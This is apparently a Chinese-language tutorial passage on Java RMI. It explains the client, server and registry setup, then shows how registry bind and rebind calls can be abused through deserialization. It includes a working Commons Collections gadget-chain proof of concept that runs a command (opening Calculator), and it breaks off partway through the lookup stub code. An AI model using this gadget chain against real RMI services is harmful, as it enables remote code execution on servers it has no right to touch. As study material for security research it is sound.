# 什么是RMI
RMI是远程方法调用的简称，能够帮助我们查找并执行远程对象的方法。通俗地说，远程调用就象将一个class放在A机器上，然后在B机器中调用这个class的方法。
RMI（Remote Method
Invocation），为远程方法调用，是允许运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法。
这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在网络上的不同计算机中。
Java RMI（Java Remote Method
Invocation），是Java编程语言里一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。
从客户端-服务器模型来看，客户端程序直接调用服务端，两者之间是通过JRMP（ Java Remote Method
Protocol）协议通信，这个协议类似于HTTP协议，规定了客户端和服务端通信要满足的规范。
在RMI中对象是通过序列化方式进行编码传输的
RMI分为三个主体部分：
  * Client-客户端：客户端调用服务端的方法
  * Server-服务端：远程调用方法对象的提供者，也是代码真正执行的地方，执行结束会返回给客户端一个方法执行的结果
  * Registry-注册中心：其实本质就是一个map，相当于是字典一样，用于客户端查询要调用的方法的引用，在低版本的JDK中，Server与Registry是可以不在一台服务器上的，而在高版本的JDK中，Server与Registry只能在一台服务器上，否则无法注册成功
总体RMI的调用实现目的就是调用远程机器的类跟调用一个写在自己的本地的类一样
唯一区别就是RMI服务端提供的方法，被调用的时候该方法是执行在服务端
# RMI交互过程
如图所示
# RMI客户端与服务端实现
1.服务端编写一个远程接口
    import java.rmi.Remote;
    import java.rmi.RemoteException;
    public interface rmi extends Remote {
        public String hello() throws RemoteException;
    }
这个接口需要
  * 使用public声明，否则客户端在尝试加载实现远程接口的远程对象时会出错。（如果客户端、服务端放一起没关系）
  * 同时需要继承Remote类
  * 接口的方法需要声明java.rmi.RemoteException报错
  * 服务端实现这个远程接口
    import java.rmi.RemoteException;
    import java.rmi.server.UnicastRemoteObject;
    public class RemoteClass extends UnicastRemoteObject implements rmi{
        public RemoteClass() throws RemoteException {
            System.out.println("构造方法");
        }
        public String hello() throws RemoteException {
            System.out.println("hello,world");
            return "hello,world";
        }
    }
这个实现类需要
  * 实现远程接口
  * 继承UnicastRemoteObject类，貌似继承了之后会使用默认socket进行通讯，并且该实现类会一直运行在服务器上（如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，在远程对象的构造方法的调用UnicastRemoteObject.exportObject()静态方法）
  * 构造函数需要抛出一个RemoteException错误
  * 实现类中使用的对象必须都可序列化，即都继承java.io.Serializable
  * 注册远程对象
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    public class Server {
        public static void main(String[] args) throws RemoteException {
            rmi hello = new RemoteClass();//创建远程对象
            Registry registry = LocateRegistry.createRegistry(1099);//创建注册表
            registry.rebind("hello",hello);//将远程对象注册到注册表里面，并且设置值为hello
        }
    }
关于绑定的地址很多地方会rmi://ip:port/Objectname的形式，实际上看rebind源码就知道RMI:写不写都行，port如果默认是1099，不写会自动补上，其他端口必须写  
那么服务端就部署好了，来看客户端
2.客户端部署
    import java.rmi.NotBoundException;
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    public class Client {
        public static void main(String[] args) throws RemoteException, NotBoundException {
            Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);//获取远程主机对象
            // 利用注册表的代理去查询远程注册表中名为hello的对象
            RemoteClass hello = (RemoteClass) registry.lookup("hello");
            // 调用远程方法
            System.out.println(hello.hello());
        }
    }
那么先运行服务端，再运行客户端，就可以完成调用
# RMI反序列化的攻击方式
## 攻击注册中心
我们与注册中心进行交互可以使用如下几种方式
  * list
  * bind
  * rebind
  * unbind
  * lookup
这几种方法位于RegistryImpl_Skel#dispatch中，如果存在readObject，则可以利用(具体流程分析可以参考p1g3师傅的过程)
dispatch里面对应关系如下
  * 0->bind
  * 1->list
  * 2->lookup
  * 3->rebind
  * 4->unbind
**list**
    case 1:
                    var2.releaseInputStream();
                    String[] var97 = var6.list();
                    try {
                        ObjectOutput var98 = var2.getResultStream(true);
                        var98.writeObject(var97);
                        break;
                    } catch (IOException var92) {
                        throw new MarshalException("error marshalling return", var92);
                    }
这里没有readObject所以无法利用
**bind &rebind**
    case 0:
                    try {
                        var11 = var2.getInputStream();
                        var7 = (String)var11.readObject();
                        var8 = (Remote)var11.readObject();
                    } catch (IOException var94) {
                        throw new UnmarshalException("error unmarshalling arguments", var94);
                    } catch (ClassNotFoundException var95) {
                        throw new UnmarshalException("error unmarshalling arguments", var95);
                    } finally {
                        var2.releaseInputStream();
                    }
                    var6.bind(var7, var8);
                    try {
                        var2.getResultStream(true);
                        break;
                    } catch (IOException var93) {
                        throw new MarshalException("error marshalling return", var93);
                    }
    case 3:
                    try {
                        var11 = var2.getInputStream();
                        var7 = (String)var11.readObject();
                        var8 = (Remote)var11.readObject();
                    } catch (IOException var85) {
                        throw new UnmarshalException("error unmarshalling arguments", var85);
                    } catch (ClassNotFoundException var86) {
                        throw new UnmarshalException("error unmarshalling arguments", var86);
                    } finally {
                        var2.releaseInputStream();
                    }
                    var6.rebind(var7, var8);
                    try {
                        var2.getResultStream(true);
                        break;
                    } catch (IOException var84) {
                        throw new MarshalException("error marshalling return", var84);
                    }
当调用bind时，会用readObject读出参数名以及远程对象，此时则可以利用
当调用rebind时，会用readObject读出参数名和远程对象，这里和bind是一样的，所以都可以利用
如果服务端存在cc1相关组件漏洞，那么就可以使用反序列化攻击
POC:
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.rmi.Remote;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.util.HashMap;
    import java.util.Map;
    public class Client {
        public static void main(String[] args) throws Exception {
            ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {
                            String.class, Class[].class }, new Object[] {
                            "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {
                            Object.class, Object[].class }, new Object[] {
                            null, new Object[0] }),
                    new InvokerTransformer("exec",
                            new Class[] { String.class }, new Object[]{"open  /System/Applications/Calculator.app"})});
            HashMap innermap = new HashMap();
            Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");
            Constructor[] constructors = clazz.getDeclaredConstructors();
            Constructor constructor = constructors[0];
            constructor.setAccessible(true);
            Map map = (Map)constructor.newInstance(innermap,chain);
            Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
            handler_constructor.setAccessible(true);
            InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler
            Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler); //创建proxy对象
            Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
            AnnotationInvocationHandler_Constructor.setAccessible(true);
            InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);
            Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);
            Remote r = Remote.class.cast(Proxy.newProxyInstance(
                    Remote.class.getClassLoader(),
                    new Class[] { Remote.class }, handler));
            registry.bind("test",r);
        }
    }
Remote.class.cast这里实际上是将一个代理对象转换为了Remote对象
**unbind &lookup**
    case 2:
                    try {
                        var10 = var2.getInputStream();
                        var7 = (String)var10.readObject();
                    } catch (IOException var89) {
                        throw new UnmarshalException("error unmarshalling arguments", var89);
                    } catch (ClassNotFoundException var90) {
                        throw new UnmarshalException("error unmarshalling arguments", var90);
                    } finally {
                        var2.releaseInputStream();
                    }
                    var8 = var6.lookup(var7);
    case 4:
                    try {
                        var10 = var2.getInputStream();
                        var7 = (String)var10.readObject();
                    } catch (IOException var81) {
                        throw new UnmarshalException("error unmarshalling arguments", var81);
                    } catch (ClassNotFoundException var82) {
                        throw new UnmarshalException("error unmarshalling arguments", var82);
                    } finally {
                        var2.releaseInputStream();
                    }
                    var6.unbind(var7);
这里也有readObject，但是和bind以及rebind不一样的是只能传入String类型，这里我们可以通过伪造连接请求进行利用，修改lookup方法代码使其可以传入对象，原先的lookup方法
Registry_Stub#lookup
    public Remote lookup(String var1) throws AccessException, NotBoundException, RemoteException {
            try {
                RemoteCall var2 = super.ref.newCall(this, operations, 2, 4905912898345647071L);
                try {
                    ObjectOutput var3 = var2.getOutputStream();
                    var3.writeObject(var1);
                } catch (IOException var18) {
                    throw new MarshalException("error marshalling arguments", var18);
                }
                super.ref.invoke(var2);
                Remote var23;
                try {
                    ObjectInput var6 = var2.getInputStream();
                    var23 = (Remote)var6.readObject();
                } catch (IOException var15) {
                    throw new UnmarshalException("error unmarshalling return", var15);
                } catch (ClassNotFoundException var16) {
                    throw new UnmarshalException("error unmarshalling return", var16);
                } finally {
                    super.ref.done(var2);
                }
                return var23;
            } catch (RuntimeException var19) {